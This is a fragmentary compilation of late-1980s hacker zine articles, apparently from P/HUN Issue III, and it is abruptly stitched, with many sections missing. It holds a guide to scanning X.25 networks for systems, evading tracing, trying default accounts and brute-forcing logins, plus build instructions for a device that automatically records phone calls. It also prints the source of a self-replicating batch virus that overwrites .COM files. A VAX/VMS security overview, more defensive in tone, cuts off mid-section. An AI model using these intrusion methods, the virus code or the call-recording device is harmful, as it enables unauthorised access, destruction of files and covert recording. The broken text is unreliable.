and then it will ask for a Username.  Enter 'phones' for the username. When it
asks for a password, enter 'phones' again.  From this point, it is menu
driven.  Use this to locate your local dialup, and call it back locally.  If
you don't have a local dialup, then use whatever means you wish to connect to
one long distance (more on this later.)
   When you call your local dialup, you will once again go through the
TERMINAL= stuff, and once again you'll be presented with a @.  This prompt lets
you know you are connected to a Telenet PAD.  PAD stands for either Packet
Assembler/Disassembler (if you talk to an engineer), or Public Access Device
(if you talk to Telenet's marketing people.)  The first description is more
correct.
   Telenet works by taking the data you enter in on the PAD you dialed into,
bundling it into a 128 byte chunk (normally... this can be changed), and then
transmitting it at speeds ranging from 9600 to 19,200 baud to another PAD, who
then takes the data and hands it down to whatever computer or system it's
connected to.  Basically, the PAD allows two computers that have different baud
rates or communication protocols to communicate with each other over a long
distance.  Sometimes you'll notice a time lag in the remote machines response.
This is called PAD Delay, and is to be expected when you're sending data
through several different links.
   What do you do with this PAD?  You use it to connect to remote computer
systems by typing 'C' for connect and then the Network User Address (NUA) of
the system you want to go to.
   An NUA takes the form of   031103130002520
                              X___/X___/X___/

and easiest way is to obtain a copy of the LOD/H Telenet Directory from the
LOD/H Technical Journal #4 or 2600 Magazine.  Jester Sluggo also put out a good
list of non-US addresses in Phrack Inc. Newsletter Issue 21.  These files will
tell you the NUA, whether it will accept collect calls or not, what type of
computer system it is (if known) and who it belongs to (also if known.)
   The second method of locating interesting addresses is to scan for them
manually.  On Telenet, you do not have to enter the 03110 DNIC to connect to a
Telenet host.  So if you saw that 031104120006140 had a VAX on it you wanted to
look at, you could type @c 412 614 (0's can be ignored most of the time.)
   If this node allows collect billed connections, it will say 412 614
CONNECTED and then you'll possibly get an identifying header or just a
Username: prompt.  If it doesn't allow collect connections, it will give you a
message such as 412 614 REFUSED COLLECT CONNECTION with some error codes out to
the right, and return you to the @ prompt.
   There are two primary ways to get around the REFUSED COLLECT message.  The
first is to use a Network User Id (NUI) to connect.  An NUI is a username/pw
combination that acts like a charge account on Telenet.  To collect to node
412 614 with NUI junk4248, password 525332, I'd type the following:
@c 412 614,junk4248,525332  <---- the 525332 will *not* be echoed to the
screen.  The problem with NUI's is that they're hard to come by unless you're
a good social engineer with a thorough knowledge of Telenet (in which case
you probably aren't reading this section), or you have someone who can
provide you with them.
   The second way to connect is to use a private PAD, either through an X.25
PAD or through something like Netlink off of a Prime computer (more on these
two below.)
   The prefix in a Telenet NUA oftentimes (not always) refers to the phone Area
Code that the computer is located in (i.e. 713 xxx would be a computer in
Houston, Texas.)  If there's a particular area you're interested in, (say,
New York City 914), you could begin by typing @c 914 001 <cr>.  If it connects,
you make a note of it and go on to 914 002.  You do this until you've found
some interesting systems to play with.
   Not all systems are on a simple xxx yyy address.  Some go out to four or
five digits (914 2354), and some have decimal or numeric extensions
(422 121A = 422 121.01).  You have to play with them, and you never know what
you're going to find.  To fully scan out a prefix would take ten million
attempts per prefix.  For example, if I want to scan 512 completely, I'd have
to start with 512 00000.00 and go through 512 00000.99, then increment the
address by 1 and try 512 00001.00 through 512 00001.99.  A lot of scanning.
There are plenty of neat computers to play with in a 3-digit scan, however,
so don't go berserk with the extensions.
   Sometimes you'll attempt to connect and it will just be sitting there after
one or two minutes.  In this case, you want to abort the connect attempt by
sending a hard break (this varies with different term programs, on Procomm,
it's ALT-B), and then when you get the @ prompt back, type 'D' for disconnect.
   If you connect to a computer and wish to disconnect, you can type <cr> @
<cr> and you it should say TELENET and then give you the @ prompt.  From there,
type D to disconnect or CONT to re-connect and continue your session
uninterrupted.

Outdials, Network Servers, and PADs
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
   In addition to computers, an NUA may connect you to several other things.
One of the most useful is the outdial.  An outdial is nothing more than a modem
you can get to over telenet- similar to the PC Pursuit concept, except that
these don't have passwords on them most of the time.
   When you connect, you will get a message like 'Hayes 1200 baud outdial,
Detroit, MI', or 'VEN-TEL 212 Modem', or possibly 'Session 1234 established
on Modem 5588'.  The best way to figure out the commands on these is to
type ? or H or HELP- this will get you all the information that you need to
use one.
   Safety tip here- when you are hacking *any* system through a phone dialup,
always use an outdial or a diverter, especially if it is a local phone number
to you.  More people get popped hacking on local computers than you can
imagine, Intra-LATA calls are the easiest things in the world to trace inexp-
ensively.
   Another nice trick you can do with an outdial is use the redial or macro
function that many of them have.  First thing you do when you connect is to
invoke the 'Redial Last Number' facility.  This will dial the last number used,
which will be the one the person using it before you typed.  Write down the
number, as no one would be calling a number without a computer on it.  This
is a good way to find new systems to hack.  Also, on a VENTEL modem, type 'D'
for Display and it will display the five numbers stored as macros in the
modem's memory.
   There are also different types of servers for remote Local Area Networks
(LAN) that have many machine all over the office or the nation connected to
them.  I'll discuss identifying these later in the computer ID section.
   And finally, you may connect to something that says 'X.25 Communication
PAD' and then some more stuff, followed by a new @ prompt.  This is a PAD
just like the one you are on, except that all attempted connections are billed
to the PAD, allowing you to connect to those nodes who earlier refused collect
connections.
   This also has the added bonus of confusing where you are connecting from.
When a packet is transmitted from PAD to PAD, it contains a header that has
the location you're calling from.  For instance, when you first connected
to Telenet, it might have said 212 44A CONNECTED if you called from the 212
area code.  This means you were calling PAD number 44A in the 212 area.
That 21244A will be sent out in the header of all packets leaving the PAD.
   Once you connect to a private PAD, however, all the packets going out
from *it* will have it's address on them, not yours.  This can be a valuable
buffer between yourself and detection.

Phone Scanning
DDDDDDDDDDDDDD
   Finally, there's the time-honored method of computer hunting that was made
famous among the non-hacker crowd by that Oh-So-Technically-Accurate movie
Wargames.  You pick a three digit phone prefix in your area and dial every
number from 0000 --> 9999 in that prefix, making a note of all the carriers
you find.  There is software available to do this for nearly every computer
in the world, so you don't have to do it by hand.

Part Three: I've Found a Computer, Now What?
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
   This next section is applicable universally.  It doesn't matter how you
found this computer, it could be through a network, or it could be from
carrier scanning your High School's phone prefix, you've got this prompt
this prompt, what the hell is it?
   I'm *NOT* going to attempt to tell you what to do once you're inside of
any of these operating systems.  Each one is worth several G-files in its
own right.  I'm going to tell you how to identify and recognize certain
OpSystems, how to approach hacking into them, and how to deal with something
that you've never seen before and have know idea what it is.


VMS-       The VAX computer is made by Digital Equipment Corporation (DEC),
           and runs the VMS (Virtual Memory System) operating system.
           VMS is characterized by the 'Username:' prompt.  It will not tell
           you if you've entered a valid username or not, and will disconnect
           you after three bad login attempts.  It also keeps track of all
           failed login attempts and informs the owner of the account next time
           s/he logs in how many bad login attempts were made on the account.
           It is one of the most secure operating systems around from the
           outside, but once you're in there are many things that you can do
           to circumvent system security.  The VAX also has the best set of
           help files in the world.  Just type HELP and read to your heart's
           content.
           Common Accounts/Defaults:  [username: password [[,password]] ]

DEC-10-    An earlier line of DEC computer equipment, running the TOPS-10
           operating system.  These machines are recognized by their
           '.' prompt.  The DEC-10/20 series are remarkably hacker-friendly,
           allowing you to enter several important commands without ever
           logging into the system.  Accounts are in the format [xxx,yyy] where
           xxx and yyy are integers.  You can get a listing of the accounts and
           the process names of everyone on the system before logging in with
           the command .systat (for SYstem STATus).  If you seen an account
           that reads [234,1001]   BOB JONES, it might be wise to try BOB or
           JONES or both for a password on this account.  To login, you type
           .login xxx,yyy  and then type the password when prompted for it.
           The system will allow you unlimited tries at an account, and does
           not keep records of bad login attempts.  It will also inform you
           if the UIC you're trying (UIC = User Identification Code, 1,2 for
           example) is bad.

UNIX-      There are dozens of different machines out there that run UNIX.
           While some might argue it isn't the best operating system in the
           world, it is certainly the most widely used.  A UNIX system will
           usually have a prompt like 'login:' in lower case.  UNIX also
           will give you unlimited shots at logging in (in most cases), and
           there is usually no log kept of bad attempts.
           Common Accounts/Defaults: (note that some systems are case
           sensitive, so use lower case as a general rule.  Also, many times
           the accounts will be unpassworded, you'll just drop right in!)

Prime-     Prime computer company's mainframe running the Primos operating
           system.  The are easy to spot, as the greet you with
           'Primecon 18.23.05' or the like, depending on the version of the
           operating system you run into.  There will usually be no prompt
           offered, it will just look like it's sitting there.  At this point,
           type 'login <username>'.  If it is a pre-18.00.00 version of Primos,
           you can hit a bunch of ^C's for the password and you'll drop in.
           Unfortunately, most people are running versions 19+.  Primos also
           comes with a good set of help files.  One of the most useful
           features of a Prime on Telenet is a facility called NETLINK.  Once
           you're inside, type NETLINK and follow the help files.  This allows
           you to connect to NUA's all over the world using the 'nc' command.
           For example, to connect to NUA 026245890040004, you would type
           @nc :26245890040004 at the netlink prompt.
           Common Accounts/Defaults:
           PRIME       PRIME or PRIMOS

HP-x000-   This system is made by Hewlett-Packard.  It is characterized by the
           ':' prompt.  The HP has one of the more complicated login sequences
           around- you type 'HELLO SESSION NAME,USERNAME,ACCOUNTNAME,GROUP'.
           Fortunately, some of these fields can be left blank in many cases.
           Since any and all of these fields can be passworded, this is not
           the easiest system to get into, except for the fact that there are
           usually some unpassworded accounts around.  In general, if the
           defaults don't work, you'll have to brute force it using the
           common password list (see below.)  The HP-x000 runs the MPE operat-
           ing system, the prompt for it will be a ':', just like the logon
           prompt.

IRIS-      IRIS stands for Interactive Real Time Information System.  It orig-
           inally ran on PDP-11's, but now runs on many other minis.  You can
           spot an IRIS by the 'Welcome to "IRIS" R9.1.4 Timesharing' banner,
           and the ACCOUNT ID? prompt.  IRIS allows unlimited tries at hacking
           in, and keeps no logs of bad attempts.  I don't know any default
           passwords, so just try the common ones from the password database
           below.

VM/CMS-    The VM/CMS operating system runs in International Business Machines
           (IBM) mainframes.  When you connect to one of these, you will get
           message similar to 'VM/370 ONLINE', and then give you a '.' prompt,
           just like TOPS-10 does.  To login, you type 'LOGON <username>'.
           Common Accounts/Defaults are:
           AUTOLOG1:            AUTOLOG or AUTOLOG1
           CMS:                 CMS

           VTAM:                VTAM

NOS-       NOS stands for Networking Operating System, and runs on the Cyber
           computer made by Control Data Corporation.  NOS identifies itself
           quite readily, with a banner of 'WELCOME TO THE NOS SOFTWARE
           SYSTEM.  COPYRIGHT CONTROL DATA 1978,1987'.  The first prompt you
           will get will be FAMILY:.  Just hit return here.  Then you'll get
           a USER NAME: prompt.  Usernames are typically 7 alpha-numerics
           characters long, and are *extremely* site dependent. Operator
           accounts begin with a digit, such as 7ETPDOC.
           Common Accounts/Defaults:
           $SYSTEM              unknown
           SYSTEMV              unknown

Decserver- This is not truly a computer system, but is a network server that
           has many different machines available from it.  A Decserver will
           say 'Enter Username>' when you first connect.  This can be anything,
           it doesn't matter, it's just an identifier.  Type 'c', as this is
           the least conspicuous thing to enter.  It will then present you
           with a 'Local>' prompt.  From here, you type 'c <systemname>' to
           connect to a system.  To get a list of system names, type
           'sh services' or 'sh nodes'.  If you have any problems, online
           help is available with the 'help' command.  Be sure and look for
           services named 'MODEM' or 'DIAL' or something similar, these are
           often outdial modems and can be useful!

GS/1-      Another type of network server.  Unlike a Decserver, you can't
           predict what prompt a GS/1 gateway is going to give you.  The
           default prompt it 'GS/1>', but this is redifinable by the
           system administrator.  To test for a GS/1, do a 'sh d'.  If that
           prints out a large list of defaults (terminal speed, prompt,
           parity, etc...), you are on a GS/1.  You connect in the same manner
           as a Decserver, typing 'c <systemname>'.  To find out what systems
           are available, do a 'sh n' or a 'sh c'.  Another trick is to do a
           'sh m', which will sometimes show you a list of macros for logging
           onto a system.  If there is a macro named VAX, for instance, type
           'do VAX'.

           The above are the main system types in use today.  There are
           hundreds of minor variants on the above, but this should be
           enough to get you started.

Unresponsive Systems
DDDDDDDDDDDDDDDDDDDD
   Occasionally you will connect to a system that will do nothing but sit
there.  This is a frustrating feeling, but a methodical approach to the system
will yield a response if you take your time.  The following list will usually
make *something* happen.
1)  Change your parity, data length, and stop bits.  A system that won't re-
    spond at 8N1 may react at 7E1 or 8E2 or 7S2.  If you don't have a term
    program that will let you set parity to EVEN, ODD, SPACE, MARK, and NONE,
    with data length of 7 or 8, and 1 or 2 stop bits, go out and buy one.
    While having a good term program isn't absolutely necessary, it sure is
    helpful.
2)  Change baud rates.  Again, if your term program will let you choose odd
    baud rates such as 600 or 1100, you will occasionally be able to penetrate
    some very interesting systems, as most systems that depend on a strange
    baud rate seem to think that this is all the security they need...
3)  Send a series of <cr>'s.
4)  Send a hard break followed by a <cr>.
5)  Type a series of .'s (periods).  The Canadian network Datapac responds
    to this.
6)  If you're getting garbage, hit an 'i'.  Tymnet responds to this, as does
    a MultiLink II.
7)  Begin sending control characters, starting with ^A --> ^Z.
8)  Change terminal emulations.  What your vt100 emulation thinks is garbage
    may all of a sudden become crystal clear using ADM-5 emulation.  This also
    relates to how good your term program is.
9)  Type LOGIN, HELLO, LOG, ATTACH, CONNECT, START, RUN, BEGIN, LOGON, GO,
    JOIN, HELP, and anything else you can think of.
10) If it's a dialin, call the numbers around it and see if a company
    answers.  If they do, try some social engineering.

Brute Force Hacking
DDDDDDDDDDDDDDDDDDD
   There will also be many occasions when the default passwords will not work
on an account.  At this point, you can either go onto the next system on your
list, or you can try to 'brute-force' your way in by trying a large database
of passwords on that one account.  Be careful, though!  This works fine on
systems that don't keep track of invalid logins, but on a system like a VMS,
someone is going to have a heart attack if they come back and see '600 Bad
Login Attempts Since Last Session' on their account.  There are also some
operating systems that disconnect after 'x' number of invalid login attempts
and refuse to allow any more attempts for one hour, or ten minutes, or some-
times until the next day.
   The following list is taken from my own password database plus the data-
base of passwords that was used in the Internet UNIX Worm that was running
around in November of 1988.  For a shorter group, try first names, computer
terms, and obvious things like 'secret', 'password', 'open', and the name
of the account.  Also try the name of the company that owns the computer
system (if known), the company initials, and things relating to the products
the company makes or deals with.

                       TELEPHONE-CONTROLLED TAPE STARTER
                       ---------------------------------
                               BY: NY HACKER
                       NEWYORK UNDERGROUND ASSOCIATION!

                    WRITTEN FOR THE P/HUN ONLINE MAGAZINE
                    :::::::::::::::::::::::::::::::::::::

BASIC ELECTRONIC KNOWLEDGE IS ASSUMED:
WHY SPEND 200$ DOLLARS ON A ANSWERING MACHINE WHILE YOU CAN SPEND JUST A DOLLAR
ON PARTS TO MAKE YOUR OWN .HAVE I CAUGHT YOUR INTREST YET?
THIS SMALL PIECE OF EQUIPMENT WILL CONVERT YOUR TAPE RECORDER INTO A FULLY
AUTOMATIC RECORDING MACHINE.THIS HAS BEEN DESIGNED IN A SUCH A WAY THAT
NO EXTERNAL POWER WILL BE NEEDED.LETS SAY SOMEONE PICKS UP THE PHONE TO DIAL
OR WHEN THERES INCOMING CALLS.THIS GADJET WILL ALLOW AUTOMATIC RECORDING TO
START BOTH WAYS AND WHEN YOU HANG UP IT STOPS.NO MODIFICATION OF THE PHONE OR
THE TAPE RECORDER IS NECCESSARY.SIMPLY CONNECT TWO WIRES TO A TELEPHONE JACK
OR ANYWHERE ELSE ACROSS YOUR TWO TELEPHONE WIRES.
THIS GADJET PLUGS IN TO THE TAPE RECORDER WHERE THE MICROPHONE USUALLY GOES.

                          HOW IT WORKS
                          ::::::::::::

                   REFER TO THE SCHEMATIC BELOW

WITH THE SWITCH TERNINALS OF YOUR TAPE RECORDER "OPEN",YOU CAN MEASURE A
VOLTAGE ACROSS THEM THAT IS EQUAL TO THE DC VOL. USED TO OPERATE THE MACHINE.
THIS IS USUALLY AROUD 6V.IF WE APPLY THIS READILY AVAILABLEVOL. TO A PAIR OF
DARLINGTON-CONNECTED TRASISTORS,Q1 AND Q2,THEY WILL TURN ON AND START THE
TAPE RECORDER. TO TURN THE TRANSISTORS OFF,AND THEREBY STOP THE MACHINE,WE
HAVE TO APPLY A NEAGATIVE VOL. TO THE BASE TO THE Q1 TRANSITOR.THIS IS DONE BY
THE VOL. FROM THE TELEPHONE LINE.
WHEN THE TELEPHONE LINE IS ON HOOK THERES 48 VOL DC.THIS WVOLTAGE IS DIVIDED
ACROSS R1,R2 AND R4 RESISTORS IN WAY THAT ALLOWS THE BASE TO Q1 TO BE NEGATIVLY
BASED THEREFORE KEEPING THE RECORDER OFF.ALSO WHEN THE PHONE IS PICKED UP
THE VOLTAGE IS ABOUT 12 VOLTS WHICH LEAVES ENOUGH WONT KEEP THE Q1 BASE
NEGATIVE TO KEEP IT CUT OFF, SO THE TAPE RECORDER STARTS.SIMPLE HUH?

                          CONSTRUCTION
                          ::::::::::::

WHAT WORKS THE BEST AS A CASING FOR THIS EQIPMENT IS A FLORECENT STARTER
HOUSING.THIS WILL FIT THE 2 TRANSISTORS,THE DIODE,4 RESISTORS AND THE COUPLING
CAPACITOR BUT THE CONTAINMENT IS UP TO YOU.
REMOVE AND DISCARD TEH STARTER ELEMENT,BUT SAVE THE BAKELITE BASE FOR USE AS
A CONVENIENT TERMINAL BOARD FOR ALL COMPONENTS.THIS BEST WAY TO DO BUILD THIS
(IF BUILDING IN A FLORECENT STARTER) IS TO USE POINT TO POINT WIRING BECAUSE
IT WILL REDUCE THE SIZE.INVERT THE BASE SO THAT THE BRASS TERMINALS ARE INSIDE
WHICH WILL MAKE WIRING EASY.THE RUBBERY MATERIAL AT THE BOTTOM WILL PROTECT THE
THE WIRES TO THE TAPRE RECORDER.THE WIRES TO THE PHONE JACK CAN DIRECTLY BE
SOLDERED TO THE TERMINAL OR WHAT I PREFER TO DO IS WHICH IS VERY CONVENIENT
IS JUST DRILL 2 HOLES IN THE COVER AND INSERT THEM.

PARTS LIST

R1 - 270K,1/4,10% RESISTOR
R2 - 68K,1/4,10%     "

  (BASE)|X
          (EMITTER)


      INSTALLATION AND USE
      ::::::::::::::::::::

PLUG THIS GADJET INTOT HE PROPER TAPE RECORDER JACKS AND SET THE MACHINE
TO PLAYBACK.WITHOUT THE GADJET NOT CONNECTED TO THE PHONE LINE,THE TAPE
RECORDER SHOULD START.IF IT DOESNT THEN THE WIRES THAT GOTO THE TAPE R. REMOTE
ARE REVERSED.
NOW THAT THE MACHINE IS PLAYING WITH THE GADJET PLUGGED IN,CONNECT THE 2 WIRES
TO THE PHONE LINE.WITH THE PHONE ON HOOK,TAPE RECORDER SHOULD STOP.IF IT DOESNT
REVERSE 2 WIRES WHICH GO TO TEL.(TELEPHONE). O.K THE TAPE RECODER HAS STOPPED,
NOW CHECK TO SEE WEATHER THE RECODER STARTS BY LIFITING UP THE HANDSET.
TO SET UP FOR RECORDING JUST PRESS THE FOWARD AND RECORD BUTTON ON THE TAPE
RECORDER.

OTHER THINGS CAN ALSO BE DONE WITH THIS . I WILL LEAVE THAT TO YOUR IMAGINATION

I WILL WRITE AN ARTICLE ON HOW TO MAKE A TELEPHONE BUG IN P/HUN #3.

                             Introduction & Index
                             --------------------

 Welcome to P/HUN (fun) Issue III. A new volume for the New Year. We still
 remember some people often ridiculed and thought that P/HUN Newsletter would
 stop producing after the first or the second issue. Looks like that fraction
 underestimated us severly.

 I would also like to say this, P/HUN was started with one highly noble
 thought in mind i.e. to spread knowledge that we individually or collectively
 acquire through various resources. The intent has and will never be to
 degrade other highly esteemed newsletters or compete with them in anyway.
 The idea is to co-exist symbiotically for the good of the readers, in mutual
 respect and assistance of each other.

 We at P/HUN Inc. are very pleased that people enjoyed our last issue.
 We received many calls from all over the U.S commenting about Mr. Slippery's
 "Guide to PICK Operating System" and The Mentor's "Beginners Hacking Guide".
 We at P/HUN Inc. would like to thank both of them for their great
 contributions and hope hear more from them in future.

 We are still looking for someone experienced enough to write various news and
 happenings that occur in the Phreak/Hack community. I thank all that applied,
 but we really didn't find anyone properly qualified.

 A lot of hard work and effort has gone into making this issue possible. Yes
 the size of this issue is record breaking. We hope you find it intresting.

 If you have any comments, suggestion or would like to submit to our ever
 growing newsletter, contact us at The Hacker's Den. If we find your article
 intresting we will gladly publish it. Remember to only send us "original" &
 "unreleased" stuff. There will be no exceptions. Although this issue contains
 an article by Capt. Zap which has already been released. This file was a major
 exeception due to the fact that we found it very intresting.

                 Viruses: Assembly, Pascal, Basic & Batch
                 ----------------------------------------
                          By  Tesla Coil ][


[ I do not take any responsibility for any damages that may occur when  ]

[ promote knowledge into the amazing world of computer viruses.         ]

Viruses can be written in practically every computer language known today.
Although most effective viruses have been written in Assembly.

Many of us think that viruses cannot be written in Basic due to its limited
ability. This is untrue. Basic has the capability of producing very effective
viruses if properly used. Combining assembly and basic could futher enhance
the effectiveness of the virus.

In this article we will examine some viruses written in Assembly, Pascal, Basic
and Batch written by B. Fix, R. Burger and M. Vallen which proved to be very
intresting to me.

Please use some caution handling these virus programs. Please use a separate
disks when you wish to compile.

                        Virus in Assembly Language
                        --------------------------

Most viruses out there have been written in assembly because assembly has the
unique ability to bypass operating system security.
Here is an example of a virus written under MS-DOS 2.1 and can obviously be
compiled in the later versions. The article contains remarks so as to further
explain the parts. Programmers may wish to delete those segments if desired.

                             Virus in Pascal
                             ---------------


Pascal is another high level language that can produce eye popping computer
viruses. Especially when the usage of Turbo Pascal is involved.
The virus below was available through various bulletin boards for
a while.

$
------------------------------------------------------------------
Number One


Please handle this virus with care!!!!!!!!!!! [Deadly Demo]

Number One infects all .COM - file's name will be displayed
That file has been overwritten with Number Ones's program code and
is not reconstructible! If all files are infected or or no .COM
files are found, Number one gives you a <Smile>.
Files may be protected against infections of Number One by
setting the Read ONLY attribute.

                           Viruses in Basic
                           ----------------


Basic is great language and often people think of it as a limited language
and will not be of any use in creating something like a virus. Well you are
really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
files.To do this you must compile the source code using a the Microsoft
Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
the source code to place the lenght of the object program in the LENGHTVIR
variable. BV3.EXE should be in the current directory, COMMAND.COM must be
available, the LENGHTVIR variable must be set to the lenght of the linked
program and remember to use /e parameter when compiling.

This basic virus will only attack .EXE files. After the execution you will
see a "INH" file which contains the directory, and the file %SORT.EXE.
Programs which start with "%" are NOT infected ,they pose as back up copies.


                            Batch Viruses
                            -------------


Whoever thought that viruses could be in BATCH file.This virus which we
are about to see makes use of MS-DOS operating system. This BATCH virus
uses DEBUG & EDLIN programs.

Name: VR.BAT

echo = off         ( Self explanatory)
ctty nul           ( This is important. Console output is turned off)
path c:Xmsdos      ( May differ on other systems )
dir *.com/w>ind    ( The directory is written on "ind" ONLY name entries)
edlin ind<1        ( "Ind" is processed with EDLIN so only file names appear)
debug ind<2        ( New batch program is created with debug)
edlin name.bat<3   ( This batch goes to an executable form because of EDLIN)
ctty con           ( Console interface is again assigned)
name               ( Newly created NAME.BAT is called.


In addition to file to this Batch file,there command files,here named 1,2,3

Here is the first command file:
-------------------------------
Name: 1

1,4d               ( Here line 1-4 of the "IND" file are deleted )
e                  ( Save file )

Here is the second command file:
--------------------------------
Name: 2

m100,10b,f000      (First program name is moved to the F000H address to save)
e108 ".BAT"        (Extention of file name is changed to .BAT)
m100,10b,f010      (File is saved again)
e100"DEL "         (DEL command is written to address 100H)
mf000,f00b,104     (Original file is written after this command)
e10c 2e            (Period is placed in from of extension)
e110 0d,0a         (Carrige return+ line feed)
mf010,f020,11f     ( Modified file is moved to 11FH address from buffer area)
e112 "COPY XVR.BAT" ( COPY command is now placed in front of file)
e12b od,0a         (COPY command terminated with carriage return + lf)
rxc                ( The CX register is ... )
2c                 ( set to 2CH)
nname.bat          ( Name it NAME.BAT)
w                  ( Write )
q                  ( quit )


The third command file must be printed as a hex dump because it contains
2 control characters (1Ah=Control Z) and this is not entirely printable.

Hex dump of the third command file:
-----------------------------------
Name: 3

0100   31 2C 31 3F 52 20 1A 0D-6E 79 79 79 79 79 79 79

In order for this virus to work VR.BAT should be in the root. This program only
affects .COM files.

                          VAX/VMS System Security
                          =======================
                Written for P/HUN Inc.,P/HUN Online Magazine
                --------------------------------------------
                             By  Lawrence Xavier
                               January, 1989


VAX/VMS may be the worlds best operating system. It certainly beats the
pants off each and every IBM OS, and wins over Unix hands down. Native
VAX/VMS security is rated higher (by the U.S. Government) than all IBM
mainframe OSs, even after such security packages as RACF and Top Secret
are added to them.

VMS is not without its foibles and kludges, however. For one thing,
enabling all the security features of VMS is guaranteed to crash the
system! For another, many of VMS's security features are  annoying to
set up, encouraging lazy system managers to put off doing so indefinitely.

VMS got a bad reputation when young hackers were able to routinely break
into many systems by using default accounts and passwords such as username
SYSTEM with password MANAGER. This has all changed with VMS 4.7: in the
upgrade procedure the installer is required to change passwords on these
accounts or eliminate them entirely.

Let's go over some of the basic features of VMS security, then look at some
common problems and loopholes. Once you know what the loopholes are you can
take steps to close them on systems you manage and increase security.


VMS Security Features
=====================

Logging In:
-----------
VAX/VMS systems have several types of protection that can be set up on
logins. Logins can be restricted by time of day, day of the week, and by
terminal ID. Logins can also be restricted by where they come from: Local,
Remote, Dialup, etc.

     Local    are logins on direct connect ports or DECservers.
     Remote   are logins across DECnet.
     Dialup   are logins across X.25 or on ports set with the DIALUP
              characteristic.

Usually VMS will present a
     Username:
prompt after it sees one or two <CR> characters (which are used by VMS to
set the Baud rate, if AutoBaud is enabled).

If a System Password has been set on the port, VMS will BEEP after the
first <CR>, and will then seem to be dead. Only after the correct System
Password has been entered will the Username: prompt be given.

VMS gives no indication of whether a correct username has been entered: it
always asks for a Password:. VMS passwords can be like any other passwords,
or they may be generated nonsense words. The /GENERATE_PASSWORD qualifier
may be placed on user accounts by the system manager, forcing them to
select from lists of supposedly easy to remember but nonsensical
passwords.

The system manager may also enforce a minimum password length and can even
impose dual passwords on accounts. If a Username with dual passwords is
entered, the system will prompt for Password: twice in a row. Automatic
Password expiration dates can be set, forcing users to change their
passwords every so often: from once a day to once a year or never.

After the Username and Password have been entered, the system will either
log the user in, or will print the familiar message,

     User Authorization Failure

and will hang up after a settable number of failures (the default is 3) if
the port characteristics include DIALUP and HANGUP.


Breakin Detection:
-----------------
If a hacker were trying to get into the system he could just continue to
dialup and try again. But VMS has some features to discourage this too.

If breakin detection and evasion is enabled, VMS will start to get cagey.
If the count of login failures from a specific source gets high enough, the
system assumes a break-in is in progress. Only login failures caused by
invalid Passwords are counted, NOT invalid usernames. And the attempts must
be coming from one of these three sources:

     .    A specific valid Username, and (if setup this way, A specific
          terminal.
     .    A specific remote DECnet node and remote Username.
     .    The Username of the creator of a detached process.

By default, VMS allows five failed login attempts from any one source
within the time period specified. But it's not as simple as that!

Each time a failure occurs, time is added to the time period in which a
certain number of failures can occur. To take an example from DEC:

     Assume the default values are in effect. LGI_BRK_LIM specifies no
     more than five login failures from one source. LGI_BRK_TMO is set
     for five minutes. Assume that an outsider starts sending user
     names and passwords to the system. When the first password fails,
     the clock starts to run and the user has four more tries in the
     next five minutes. When the second attempt fails about 30 seconds
     later, the user has three tries left that will be counted over
     the next 9.5 minutes. When the third attempt fails 30 seconds
     later, the login failure observation time has reached 22.5
     minutes. As a result, the next login failure from that source
     within 22.4 minutes will trigger evasive action. The system
     tolerates an average rate of login failures that is the
     reciprocal of the parameter LGI_BRK_TMO...


When breakin evasion is triggered, the system will give a:
     User Authorization Failure
message even when a valid Username and Password are entered, giving no
indication of what it is doing. Note that ONLY the Username(s) in question
are treated this way: other Usernames can still log in from the same
terminal even if terminal-specific breakin detection is enabled.

The length of time VMS will hide in this way is controlled by the sysgen
parameter LGI_HID_TIM. But VMS doesn't hide for exactly this time. Rather,
it will hide for a length of time determined by the following equation:

     Evasion time = LGI_HID_TIM * (random number between 1 and 1.5)

The parameter LGI_BRK_DISUSER can be set, and will tell VMS to permanently
disable accounts rather than just hiding for a time. The system manager
then has to re-enable them manually. This is a dangerous parameter to set,
however, because malicious individuals could deliberately disable accounts
then! If the SYSTEM account is disabled this way, it will only be allowed
to login on the VAX system console.


Security Alarms:
----------------
Although breakin attempts to different Usernames don't activate VMS Breakin
detection, they can trigger Security Alarms. Security Alarms can also be
triggered by different types of access to specific files or memory areas.
Security Alarms cause messages to be displayed on the system console, on
the terminals of any user enabled as Security Operator, and in the Operator
Log file.

As DEC says,
     Because security auditing affects system performance, enable
     security alarms only for the most important events.
Damn right! If all security alarms are enabled the system will hang! It
starts writing alarms about the fact it is writing alarms, ad infinitum....

Security alarms can be triggered on multiple login failures, on breakin, on
successful login from given ports, on failed attempts to access files, on
successful attempts to access files, etc. So even if you get privilege to
override protection or to defeat it a security alarm may still be
triggered.

Security alarms typically might be enabled on the AUTHORIZE program, which
adds and modifies user accounts, on SYSUAF.DAT, the authorization database,
on RIGHTSLIST.DAT, the access rights database, etc. and on critical
database files. But many sites don't bother with them because of their
inconvenience.

Accounting:
----------
Besides Security Alarms, Accounting can be enabled. Accounting can show
successful logins, login failures, how much resources are consumed by
processes, what programs are executed, etc. Not all sites enable
accounting, and not all sites enable the same amount of it. Accounting
records show login failures but only show the username that attempted to
login if it is a valid username.



File and Device Protection:
==========================

UIC:
----
The primary access protection mechanism is the UIC. This consists of a
Group and a User code, numerically represented as [nnn,nnn]. It is an Octal
number. Since VMS 4.x versions the UIC can also be expressed as [name] or
[name,name], but internally this is translated back to the old format.

Users, processes, files, devices, memory sections, etc. all have UICs.
Files, devices, memory sections, etc. can have access by System, Owner,
Group and World, any combination of Read, Write, Execute, Delete for each
category.
     System    are the system accounts.
     Owner     is the account(s) who's UIC is the same as that on the
               object (file, device, etc.).
     Group     are accounts with the same first UIC number.
     World     is everyone.

So a process with UIC [23,7] could access an object with UIC [23,4] if that
object allowed access by Group or World. The process could access an object
with UIC [25,3] only if World access was allowed, and could access objects
with UIC [23,7] if Owner, Group, or World was allowed.

ACL:
----
Also, there's a protection mechanism called the ACL or Access Control List.
This is in addition to, and can override UIC protection. With ACLs an
Identifier is created, like MODEM for one or more modem ports. An ACL is
created on the port(s) desired, and in the ACL are multiple Access Control
Entries (ACEs). If one of them is:
     (Identifier=MODEM, Access=Read+Write)
for example, user who has been Granted the identifier MODEM can access
those ports. These access privileges, like UICs apply to processes in
general. Granting and managing Identifiers is done in the AUTHORIZE
program.



Loopholes, Ways of Defeating Security...
========================================

Although VMS has great security it's often applied poorly. For one thing,
